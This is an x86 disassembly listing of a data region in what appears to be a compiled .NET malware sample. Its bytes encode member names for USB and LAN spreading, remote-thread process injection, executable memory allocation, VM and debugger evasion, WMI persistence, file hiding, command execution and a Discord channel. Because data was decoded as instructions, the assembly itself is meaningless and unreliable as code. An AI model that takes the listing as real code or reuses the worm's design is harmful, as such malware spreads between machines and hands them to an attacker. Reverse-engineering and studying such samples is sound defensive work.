  4076b3:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  4076b7:	49                   	dec    %ecx
  4076b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4076b9:	74 36                	je     0x4076f1
  4076bb:	34 00                	xor    $0x0,%al
  4076bd:	3c 69                	cmp    $0x69,%al
  4076bf:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  4076c5:	3c 3e                	cmp    $0x3e,%al
  4076c7:	37                   	aaa
  4076c8:	5f                   	pop    %edi
  4076c9:	5f                   	pop    %edi
  4076ca:	77 72                	ja     0x40773e
  4076cc:	61                   	popa
  4076cd:	70 34                	jo     0x407703
  4076cf:	00 3c 4f             	add    %bh,(%edi,%ecx,2)
  4076d2:	70 65                	jo     0x407739
  4076d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d5:	46                   	inc    %esi
  4076d6:	61                   	popa
  4076d7:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  4076db:	6e                   	outsb  %ds:(%esi),(%dx)
  4076dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4076dd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4076e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4076e3:	41                   	inc    %ecx
  4076e4:	73 79                	jae    0x40775f
  4076e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4076e7:	63 3e                	arpl   %edi,(%esi)
  4076e9:	64 5f                	fs pop %edi
  4076eb:	5f                   	pop    %edi
  4076ec:	35 00 3c 54 72       	xor    $0x72543c00,%eax
  4076f1:	79 53                	jns    0x407746
  4076f3:	63 68 65             	arpl   %ebp,0x65(%eax)
  4076f6:	64 75 6c             	fs jne 0x407765
  4076f9:	65 52                	gs push %edx
  4076fb:	65 6d                	gs insl (%dx),%es:(%edi)
  4076fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fe:	74 65                	je     0x407765
  407700:	45                   	inc    %ebp
  407701:	78 65                	js     0x407768
  407703:	63 75 74             	arpl   %esi,0x74(%ebp)
  407706:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  40770d:	63 3e                	arpl   %edi,(%esi)
  40770f:	64 5f                	fs pop %edi
  407711:	5f                   	pop    %edi
  407712:	31 36                	xor    %esi,(%esi)
  407714:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  407717:	70 72                	jo     0x40778b
  407719:	65 61                	gs popa
  40771b:	64 4f                	fs dec %edi
  40771d:	6e                   	outsb  %ds:(%esi),(%dx)
  40771e:	63 65 41             	arpl   %esp,0x41(%ebp)
  407721:	73 79                	jae    0x40779c
  407723:	6e                   	outsb  %ds:(%esi),(%dx)
  407724:	63 3e                	arpl   %edi,(%esi)
  407726:	64 5f                	fs pop %edi
  407728:	5f                   	pop    %edi
  407729:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
  40772d:	74 5f                	je     0x40778e
  40772f:	55                   	push   %ebp
  407730:	54                   	push   %esp
  407731:	46                   	inc    %esi
  407732:	38 00                	cmp    %al,(%eax)
  407734:	3c 53                	cmp    $0x53,%al
  407736:	70 72                	jo     0x4077aa
  407738:	65 61                	gs popa
  40773a:	64 41                	fs inc %ecx
  40773c:	73 79                	jae    0x4077b7
  40773e:	6e                   	outsb  %ds:(%esi),(%dx)
  40773f:	63 3e                	arpl   %edi,(%esi)
  407741:	64 5f                	fs pop %edi
  407743:	5f                   	pop    %edi
  407744:	38 00                	cmp    %al,(%eax)
  407746:	39 37                	cmp    %esi,(%edi)
  407748:	32 30                	xor    (%eax),%dh
  40774a:	32 46 30             	xor    0x30(%esi),%al
  40774d:	46                   	inc    %esi
  40774e:	42                   	inc    %edx
  40774f:	43                   	inc    %ebx
  407750:	43                   	inc    %ebx
  407751:	38 44 45 35          	cmp    %al,0x35(%ebp,%eax,2)
  407755:	43                   	inc    %ebx
  407756:	43                   	inc    %ebx
  407757:	33 43 30             	xor    0x30(%ebx),%eax
  40775a:	35 37 37 44 41       	xor    $0x41443737,%eax
  40775f:	42                   	inc    %edx
  407760:	44                   	inc    %esp
  407761:	34 41                	xor    $0x41,%al
  407763:	45                   	inc    %ebp
  407764:	38 34 30             	cmp    %dh,(%eax,%esi,1)
  407767:	39 33                	cmp    %esi,(%ebx)
  407769:	44                   	inc    %esp
  40776a:	33 31                	xor    (%ecx),%esi
  40776c:	42                   	inc    %edx
  40776d:	45                   	inc    %ebp
  40776e:	37                   	aaa
  40776f:	41                   	inc    %ecx
  407770:	44                   	inc    %esp
  407771:	31 30                	xor    %esi,(%eax)
  407773:	35 45 41 36 34       	xor    $0x34364145,%eax
  407778:	41                   	inc    %ecx
  407779:	36 45                	ss inc %ebp
  40777b:	36 38 36             	cmp    %dh,%ss:(%esi)
  40777e:	43                   	inc    %ebx
  40777f:	43                   	inc    %ebx
  407780:	30 38                	xor    %bh,(%eax)
  407782:	42                   	inc    %edx
  407783:	35 36 39 00 3c       	xor    $0x3c003936,%eax
  407788:	3e 39 00             	cmp    %eax,%ds:(%eax)
  40778b:	3c 4d                	cmp    $0x4d,%al
  40778d:	6f                   	outsl  %ds:(%esi),(%dx)
  40778e:	64 75 6c             	fs jne 0x4077fd
  407791:	65 3e 00 3c 4d 61 69 	gs add %bh,%ds:0x3e6e6961(,%ecx,2)
  407798:	6e 3e 
  40779a:	00 3c 50             	add    %bh,(%eax,%edx,2)
  40779d:	72 69                	jb     0x407808
  40779f:	76 61                	jbe    0x407802
  4077a1:	74 65                	je     0x407808
  4077a3:	49                   	dec    %ecx
  4077a4:	6d                   	insl   (%dx),%es:(%edi)
  4077a5:	70 6c                	jo     0x407813
  4077a7:	65 6d                	gs insl (%dx),%es:(%edi)
  4077a9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077ab:	74 61                	je     0x40780e
  4077ad:	74 69                	je     0x407818
  4077af:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4077b1:	44                   	inc    %esp
  4077b2:	65 74 61             	gs je  0x407816
  4077b5:	69 6c 73 3e 00 52 43 	imul   $0x45435200,0x3e(%ebx,%esi,2),%ebp
  4077bc:	45 
  4077bd:	00 50 41             	add    %dl,0x41(%eax)
  4077c0:	47                   	inc    %edi
  4077c1:	45                   	inc    %ebp
  4077c2:	5f                   	pop    %edi
  4077c3:	45                   	inc    %ebp
  4077c4:	58                   	pop    %eax
  4077c5:	45                   	inc    %ebp
  4077c6:	43                   	inc    %ebx
  4077c7:	55                   	push   %ebp
  4077c8:	54                   	push   %esp
  4077c9:	45                   	inc    %ebp
  4077ca:	5f                   	pop    %edi
  4077cb:	52                   	push   %edx
  4077cc:	45                   	inc    %ebp
  4077cd:	41                   	inc    %ecx
  4077ce:	44                   	inc    %esp
  4077cf:	57                   	push   %edi
  4077d0:	52                   	push   %edx
  4077d1:	49                   	dec    %ecx
  4077d2:	54                   	push   %esp
  4077d3:	45                   	inc    %ebp
  4077d4:	00 4d 45             	add    %cl,0x45(%ebp)
  4077d7:	4d                   	dec    %ebp
  4077d8:	5f                   	pop    %edi
  4077d9:	52                   	push   %edx
  4077da:	45                   	inc    %ebp
  4077db:	53                   	push   %ebx
  4077dc:	45                   	inc    %ebp
  4077dd:	52                   	push   %edx
  4077de:	56                   	push   %esi
  4077df:	45                   	inc    %ebp
  4077e0:	00 32                	add    %dh,(%edx)
  4077e2:	35 31 34 34 37       	xor    $0x37343431,%eax
  4077e7:	45                   	inc    %ebp
  4077e8:	45                   	inc    %ebp
  4077e9:	39 31                	cmp    %esi,(%ecx)
  4077eb:	41                   	inc    %ecx
  4077ec:	39 30                	cmp    %esi,(%eax)
  4077ee:	36 37                	ss aaa
  4077f0:	44                   	inc    %esp
  4077f1:	43                   	inc    %ebx
  4077f2:	44                   	inc    %esp
  4077f3:	36 41                	ss inc %ecx
  4077f5:	42                   	inc    %edx
  4077f6:	39 36                	cmp    %esi,(%esi)
  4077f8:	37                   	aaa
  4077f9:	30 33                	xor    %dh,(%ebx)
  4077fb:	31 33                	xor    %esi,(%ebx)
  4077fd:	33 46 36             	xor    0x36(%esi),%eax
  407800:	31 37                	xor    %esi,(%edi)
  407802:	35 36 35 39 37       	xor    $0x37393536,%eax
  407807:	34 43                	xor    $0x43,%al
  407809:	44                   	inc    %esp
  40780a:	36 43                	ss inc %ebx
  40780c:	34 38                	xor    $0x38,%al
  40780e:	31 39                	xor    %edi,(%ecx)
  407810:	30 32                	xor    %dh,(%edx)
  407812:	31 37                	xor    %esi,(%edi)
  407814:	36 30 43 34          	xor    %al,%ss:0x34(%ebx)
  407818:	36 38 38             	cmp    %bh,%ss:(%eax)
  40781b:	43                   	inc    %ebx
  40781c:	39 31                	cmp    %esi,(%ecx)
  40781e:	41                   	inc    %ecx
  40781f:	42                   	inc    %edx
  407820:	46                   	inc    %esi
  407821:	00 49 73             	add    %cl,0x73(%ecx)
  407824:	52                   	push   %edx
  407825:	75 6e                	jne    0x407895
  407827:	6e                   	outsb  %ds:(%esi),(%dx)
  407828:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  40782f:	00 49 73             	add    %cl,0x73(%ecx)
  407832:	44                   	inc    %esp
  407833:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407837:	67 65 64 4f          	addr16 gs fs dec %edi
  40783b:	72 56                	jb     0x407893
  40783d:	4d                   	dec    %ebp
  40783e:	00 53 79             	add    %dl,0x79(%ebx)
  407841:	73 74                	jae    0x4078b7
  407843:	65 6d                	gs insl (%dx),%es:(%edi)
  407845:	2e 49                	cs dec %ecx
  407847:	4f                   	dec    %edi
  407848:	00 50 52             	add    %dl,0x52(%eax)
  40784b:	4f                   	dec    %edi
  40784c:	43                   	inc    %ebx
  40784d:	45                   	inc    %ebp
  40784e:	53                   	push   %ebx
  40784f:	53                   	push   %ebx
  407850:	5f                   	pop    %edi
  407851:	41                   	inc    %ecx
  407852:	4c                   	dec    %esp
  407853:	4c                   	dec    %esp
  407854:	5f                   	pop    %edi
  407855:	41                   	inc    %ecx
  407856:	43                   	inc    %ebx
  407857:	43                   	inc    %ebx
  407858:	45                   	inc    %ebp
  407859:	53                   	push   %ebx
  40785a:	53                   	push   %ebx
  40785b:	00 53 54             	add    %dl,0x54(%ebx)
  40785e:	41                   	inc    %ecx
  40785f:	54                   	push   %esp
  407860:	55                   	push   %ebp
  407861:	53                   	push   %ebx
  407862:	5f                   	pop    %edi
  407863:	53                   	push   %ebx
  407864:	55                   	push   %ebp
  407865:	43                   	inc    %ebx
  407866:	43                   	inc    %ebx
  407867:	45                   	inc    %ebp
  407868:	53                   	push   %ebx
  407869:	53                   	push   %ebx
  40786a:	00 4d 45             	add    %cl,0x45(%ebp)
  40786d:	4d                   	dec    %ebp
  40786e:	5f                   	pop    %edi
  40786f:	43                   	inc    %ebx
  407870:	4f                   	dec    %edi
  407871:	4d                   	dec    %ebp
  407872:	4d                   	dec    %ebp
  407873:	49                   	dec    %ecx
  407874:	54                   	push   %esp
  407875:	00 62 4e             	add    %ah,0x4e(%edx)
  407878:	65 65 64 53          	gs gs fs push %ebx
  40787c:	63 62 00             	arpl   %esp,0x0(%edx)
  40787f:	6d                   	insl   (%dx),%es:(%edi)
  407880:	73 63                	jae    0x4078e5
  407882:	6f                   	outsl  %ds:(%esi),(%dx)
  407883:	72 6c                	jb     0x4078f1
  407885:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  40788c:	6d                   	insl   (%dx),%es:(%edi)
  40788d:	61                   	popa
  40788e:	63 00                	arpl   %eax,(%eax)
  407890:	53                   	push   %ebx
  407891:	79 73                	jns    0x407906
  407893:	74 65                	je     0x4078fa
  407895:	6d                   	insl   (%dx),%es:(%edi)
  407896:	2e 43                	cs inc %ebx
  407898:	6f                   	outsl  %ds:(%esi),(%dx)
  407899:	6c                   	insb   (%dx),%es:(%edi)
  40789a:	6c                   	insb   (%dx),%es:(%edi)
  40789b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4078a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a1:	73 2e                	jae    0x4078d1
  4078a3:	47                   	inc    %edi
  4078a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4078a6:	65 72 69             	gs jb  0x407912
  4078a9:	63 00                	arpl   %eax,(%eax)
  4078ab:	53                   	push   %ebx
  4078ac:	70 72                	jo     0x407920
  4078ae:	65 61                	gs popa
  4078b0:	64 41                	fs inc %ecx
  4078b2:	73 79                	jae    0x40792d
  4078b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b5:	63 00                	arpl   %eax,(%eax)
  4078b7:	53                   	push   %ebx
  4078b8:	70 72                	jo     0x40792c
  4078ba:	65 61                	gs popa
  4078bc:	64 4f                	fs dec %edi
  4078be:	6e                   	outsb  %ds:(%esi),(%dx)
  4078bf:	63 65 41             	arpl   %esp,0x41(%ebp)
  4078c2:	73 79                	jae    0x40793d
  4078c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c5:	63 00                	arpl   %eax,(%eax)
  4078c7:	4f                   	dec    %edi
  4078c8:	70 65                	jo     0x40792f
  4078ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4078cb:	46                   	inc    %esi
  4078cc:	61                   	popa
  4078cd:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  4078d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4078d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d9:	41                   	inc    %ecx
  4078da:	73 79                	jae    0x407955
  4078dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4078dd:	63 00                	arpl   %eax,(%eax)
  4078df:	54                   	push   %esp
  4078e0:	72 79                	jb     0x40795b
  4078e2:	53                   	push   %ebx
  4078e3:	63 68 65             	arpl   %ebp,0x65(%eax)
  4078e6:	64 75 6c             	fs jne 0x407955
  4078e9:	65 52                	gs push %edx
  4078eb:	65 6d                	gs insl (%dx),%es:(%edi)
  4078ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ee:	74 65                	je     0x407955
  4078f0:	45                   	inc    %ebp
  4078f1:	78 65                	js     0x407958
  4078f3:	63 75 74             	arpl   %esi,0x74(%ebp)
  4078f6:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  4078fd:	63 00                	arpl   %eax,(%eax)
  4078ff:	43                   	inc    %ebx
  407900:	6f                   	outsl  %ds:(%esi),(%dx)
  407901:	6e                   	outsb  %ds:(%esi),(%dx)
  407902:	6e                   	outsb  %ds:(%esi),(%dx)
  407903:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  407908:	79 6e                	jns    0x407978
  40790a:	63 00                	arpl   %eax,(%eax)
  40790c:	57                   	push   %edi
  40790d:	61                   	popa
  40790e:	69 74 41 73 79 6e 63 	imul   $0x636e79,0x73(%ecx,%eax,2),%esi
  407915:	00 
  407916:	73 76                	jae    0x40798e
  407918:	63 00                	arpl   %eax,(%eax)
  40791a:	3c 3c                	cmp    $0x3c,%al
  40791c:	53                   	push   %ebx
  40791d:	74 61                	je     0x407980
  40791f:	72 74                	jb     0x407995
  407921:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  407925:	33 5f 30             	xor    0x30(%edi),%ebx
  407928:	3e 64 00 3c 3c       	ds add %bh,%fs:(%esp,%edi,1)
  40792d:	53                   	push   %ebx
  40792e:	74 61                	je     0x407991
  407930:	72 74                	jb     0x4079a6
  407932:	53                   	push   %ebx
  407933:	70 72                	jo     0x4079a7
  407935:	65 61                	gs popa
  407937:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  40793e:	5f 
  40793f:	34 5f                	xor    $0x5f,%al
  407941:	30 3e                	xor    %bh,(%esi)
  407943:	64 00 3c 3c          	add    %bh,%fs:(%esp,%edi,1)
  407947:	53                   	push   %ebx
  407948:	70 72                	jo     0x4079bc
  40794a:	65 61                	gs popa
  40794c:	64 41                	fs inc %ecx
  40794e:	73 79                	jae    0x4079c9
  407950:	6e                   	outsb  %ds:(%esi),(%dx)
  407951:	63 3e                	arpl   %edi,(%esi)
  407953:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  407956:	31 3e                	xor    %edi,(%esi)
  407958:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40795c:	74 5f                	je     0x4079bd
  40795e:	49                   	dec    %ecx
  40795f:	64 00 6c 70 54       	add    %ch,%fs:0x54(%eax,%esi,2)
  407964:	68 72 65 61 64       	push   $0x64616572
  407969:	49                   	dec    %ecx
  40796a:	64 00 70 72          	add    %dh,%fs:0x72(%eax)
  40796e:	6f                   	outsl  %ds:(%esi),(%dx)
  40796f:	63 65 73             	arpl   %esp,0x73(%ebp)
  407972:	73 49                	jae    0x4079bd
  407974:	64 00 43 72          	add    %al,%fs:0x72(%ebx)
  407978:	65 61                	gs popa
  40797a:	74 65                	je     0x4079e1
  40797c:	52                   	push   %edx
  40797d:	65 6d                	gs insl (%dx),%es:(%edi)
  40797f:	6f                   	outsl  %ds:(%esi),(%dx)
  407980:	74 65                	je     0x4079e7
  407982:	54                   	push   %esp
  407983:	68 72 65 61 64       	push   $0x64616572
  407988:	00 55 73             	add    %dl,0x73(%ebp)
  40798b:	62 53 70             	bound  %edx,0x70(%ebx)
  40798e:	72 65                	jb     0x4079f5
  407990:	61                   	popa
  407991:	64 00 4c 61 6e       	add    %cl,%fs:0x6e(%ecx,%eiz,2)
  407996:	53                   	push   %ebx
  407997:	70 72                	jo     0x407a0b
  407999:	65 61                	gs popa
  40799b:	64 00 43 70          	add    %al,%fs:0x70(%ebx)
  40799f:	75 6c                	jne    0x407a0d
  4079a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a2:	61                   	popa
  4079a3:	64 00 70 61          	add    %dh,%fs:0x61(%eax)
  4079a7:	79 6c                	jns    0x407a15
  4079a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4079aa:	61                   	popa
  4079ab:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4079af:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  4079b3:	70 79                	jo     0x407a2e
  4079b5:	54                   	push   %esp
  4079b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079b7:	41                   	inc    %ecx
  4079b8:	70 70                	jo     0x407a2a
  4079ba:	44                   	inc    %esp
  4079bb:	61                   	popa
  4079bc:	74 61                	je     0x407a1f
  4079be:	49                   	dec    %ecx
  4079bf:	66 4e                	dec    %si
  4079c1:	65 65 64 65 64 00 49 	gs gs fs gs add %cl,%fs:0x73(%ecx)
  4079c8:	73 
  4079c9:	44                   	inc    %esp
  4079ca:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4079ce:	67 65 72 41          	addr16 gs jb 0x407a13
  4079d2:	74 74                	je     0x407a48
  4079d4:	61                   	popa
  4079d5:	63 68 65             	arpl   %ebp,0x65(%eax)
  4079d8:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4079dc:	74 5f                	je     0x407a3d
  4079de:	49                   	dec    %ecx
  4079df:	73 41                	jae    0x407a22
  4079e1:	74 74                	je     0x407a57
  4079e3:	61                   	popa
  4079e4:	63 68 65             	arpl   %ebp,0x65(%eax)
  4079e7:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4079eb:	74 5f                	je     0x407a4c
  4079ed:	43                   	inc    %ebx
  4079ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f1:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4079f6:	00 67 65             	add    %ah,0x65(%edi)
  4079f9:	74 5f                	je     0x407a5a
  4079fb:	49                   	dec    %ecx
  4079fc:	73 43                	jae    0x407a41
  4079fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407a00:	6e                   	outsb  %ds:(%esi),(%dx)
  407a01:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407a06:	00 41 77             	add    %al,0x77(%ecx)
  407a09:	61                   	popa
  407a0a:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  407a11:	65 
  407a12:	4f                   	dec    %edi
  407a13:	6e                   	outsb  %ds:(%esi),(%dx)
  407a14:	43                   	inc    %ebx
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	6d                   	insl   (%dx),%es:(%edi)
  407a17:	70 6c                	jo     0x407a85
  407a19:	65 74 65             	gs je  0x407a81
  407a1c:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407a20:	74 5f                	je     0x407a81
  407a22:	49                   	dec    %ecx
  407a23:	73 43                	jae    0x407a68
  407a25:	6f                   	outsl  %ds:(%esi),(%dx)
  407a26:	6d                   	insl   (%dx),%es:(%edi)
  407a27:	70 6c                	jo     0x407a95
  407a29:	65 74 65             	gs je  0x407a91
  407a2c:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407a30:	74 5f                	je     0x407a91
  407a32:	49                   	dec    %ecx
  407a33:	73 43                	jae    0x407a78
  407a35:	61                   	popa
  407a36:	6e                   	outsb  %ds:(%esi),(%dx)
  407a37:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  407a3a:	6c                   	insb   (%dx),%es:(%edi)
  407a3b:	61                   	popa
  407a3c:	74 69                	je     0x407aa7
  407a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a3f:	6e                   	outsb  %ds:(%esi),(%dx)
  407a40:	52                   	push   %edx
  407a41:	65 71 75             	gs jno 0x407ab9
  407a44:	65 73 74             	gs jae 0x407abb
  407a47:	65 64 00 62 52       	gs add %ah,%fs:0x52(%edx)
  407a4c:	65 73 65             	gs jae 0x407ab4
  407a4f:	72 76                	jb     0x407ac7
  407a51:	65 64 00 53 79       	gs add %dl,%fs:0x79(%ebx)
  407a56:	73 74                	jae    0x407acc
  407a58:	65 6d                	gs insl (%dx),%es:(%edi)
  407a5a:	2e 43                	cs inc %ebx
  407a5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a5d:	6c                   	insb   (%dx),%es:(%edi)
  407a5e:	6c                   	insb   (%dx),%es:(%edi)
  407a5f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407a64:	6e                   	outsb  %ds:(%esi),(%dx)
  407a65:	73 2e                	jae    0x407a95
  407a67:	53                   	push   %ebx
  407a68:	70 65                	jo     0x407acf
  407a6a:	63 69 61             	arpl   %ebp,0x61(%ecx)
  407a6d:	6c                   	insb   (%dx),%es:(%edi)
  407a6e:	69 7a 65 64 00 4e 65 	imul   $0x654e0064,0x65(%edx),%edi
  407a75:	77 47                	ja     0x407abe
  407a77:	75 69                	jne    0x407ae2
  407a79:	64 00 54 72 69       	add    %dl,%fs:0x69(%edx,%esi,2)
  407a7e:	6d                   	insl   (%dx),%es:(%edi)
  407a7f:	45                   	inc    %ebp
  407a80:	6e                   	outsb  %ds:(%esi),(%dx)
  407a81:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407a85:	61                   	popa
  407a86:	64 54                	fs push %esp
  407a88:	6f                   	outsl  %ds:(%esi),(%dx)
  407a89:	45                   	inc    %ebp
  407a8a:	6e                   	outsb  %ds:(%esi),(%dx)
  407a8b:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  407a8f:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  407a93:	65 43                	gs inc %ebx
  407a95:	6f                   	outsl  %ds:(%esi),(%dx)
  407a96:	6d                   	insl   (%dx),%es:(%edi)
  407a97:	6d                   	insl   (%dx),%es:(%edi)
  407a98:	61                   	popa
  407a99:	6e                   	outsb  %ds:(%esi),(%dx)
  407a9a:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  407a9e:	6d                   	insl   (%dx),%es:(%edi)
  407a9f:	6d                   	insl   (%dx),%es:(%edi)
  407aa0:	61                   	popa
  407aa1:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa2:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  407aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa7:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407aab:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407ab2:	61 
  407ab3:	6c                   	insb   (%dx),%es:(%edi)
  407ab4:	75 65                	jne    0x407b1b
  407ab6:	4b                   	dec    %ebx
  407ab7:	69 6e 64 00 72 6e 64 	imul   $0x646e7200,0x64(%esi),%ebp
  407abe:	00 73 65             	add    %dh,0x65(%ebx)
  407ac1:	74 5f                	je     0x407b22
  407ac3:	49                   	dec    %ecx
  407ac4:	73 42                	jae    0x407b08
  407ac6:	61                   	popa
  407ac7:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407aca:	72 6f                	jb     0x407b3b
  407acc:	75 6e                	jne    0x407b3c
  407ace:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407ad2:	76 6f                	jbe    0x407b43
  407ad4:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  407ad8:	74 68                	je     0x407b42
  407ada:	6f                   	outsl  %ds:(%esi),(%dx)
  407adb:	64 00 44 69 73       	add    %al,%fs:0x73(%ecx,%ebp,2)
  407ae0:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae3:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  407ae7:	74 5f                	je     0x407b48
  407ae9:	50                   	push   %eax
  407aea:	61                   	popa
  407aeb:	73 73                	jae    0x407b60
  407aed:	77 6f                	ja     0x407b5e
  407aef:	72 64                	jb     0x407b55
  407af1:	00 4e 65             	add    %cl,0x65(%esi)
  407af4:	74 77                	je     0x407b6d
  407af6:	6f                   	outsl  %ds:(%esi),(%dx)
  407af7:	72 6b                	jb     0x407b64
  407af9:	49                   	dec    %ecx
  407afa:	6e                   	outsb  %ds:(%esi),(%dx)
  407afb:	74 65                	je     0x407b62
  407afd:	72 66                	jb     0x407b65
  407aff:	61                   	popa
  407b00:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b03:	52                   	push   %edx
  407b04:	65 70 6c             	gs jo  0x407b73
  407b07:	61                   	popa
  407b08:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b0b:	49                   	dec    %ecx
  407b0c:	73 4e                	jae    0x407b5c
  407b0e:	75 6c                	jne    0x407b7c
  407b10:	6c                   	insb   (%dx),%es:(%edi)
  407b11:	4f                   	dec    %edi
  407b12:	72 57                	jb     0x407b6b
  407b14:	68 69 74 65 53       	push   $0x53657469
  407b19:	70 61                	jo     0x407b7c
  407b1b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b1e:	43                   	inc    %ebx
  407b1f:	72 65                	jb     0x407b86
  407b21:	61                   	popa
  407b22:	74 65                	je     0x407b89
  407b24:	49                   	dec    %ecx
  407b25:	6e                   	outsb  %ds:(%esi),(%dx)
  407b26:	73 74                	jae    0x407b9c
  407b28:	61                   	popa
  407b29:	6e                   	outsb  %ds:(%esi),(%dx)
  407b2a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b2d:	57                   	push   %edi
  407b2e:	4d                   	dec    %ebp
  407b2f:	49                   	dec    %ecx
  407b30:	50                   	push   %eax
  407b31:	65 72 73             	gs jb  0x407ba7
  407b34:	69 73 74 65 6e 63 65 	imul   $0x65636e65,0x74(%ebx),%esi
  407b3b:	00 43 61             	add    %al,0x61(%ebx)
  407b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3f:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  407b42:	6c                   	insb   (%dx),%es:(%edi)
  407b43:	61                   	popa
  407b44:	74 69                	je     0x407baf
  407b46:	6f                   	outsl  %ds:(%esi),(%dx)
  407b47:	6e                   	outsb  %ds:(%esi),(%dx)
  407b48:	54                   	push   %esp
  407b49:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4a:	6b 65 6e 53          	imul   $0x53,0x6e(%ebp),%esp
  407b4e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4f:	75 72                	jne    0x407bc3
  407b51:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b54:	73 6f                	jae    0x407bc5
  407b56:	75 72                	jne    0x407bca
  407b58:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b5b:	43                   	inc    %ebx
  407b5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5d:	70 79                	jo     0x407bd8
  407b5f:	41                   	inc    %ecx
  407b60:	6e                   	outsb  %ds:(%esi),(%dx)
  407b61:	64 48                	fs dec %eax
  407b63:	69 64 65 00 44 65 6c 	imul   $0x656c6544,0x0(%ebp,%eiz,2),%esp
  407b6a:	65 
  407b6b:	74 65                	je     0x407bd2
  407b6d:	53                   	push   %ebx
  407b6e:	75 62                	jne    0x407bd2
  407b70:	4b                   	dec    %ebx
  407b71:	65 79 54             	gs jns 0x407bc8
  407b74:	72 65                	jb     0x407bdb
  407b76:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407b7a:	74 5f                	je     0x407bdb
  407b7c:	4d                   	dec    %ebp
  407b7d:	65 73 73             	gs jae 0x407bf3
  407b80:	61                   	popa
  407b81:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  407b86:	73 73                	jae    0x407bfb
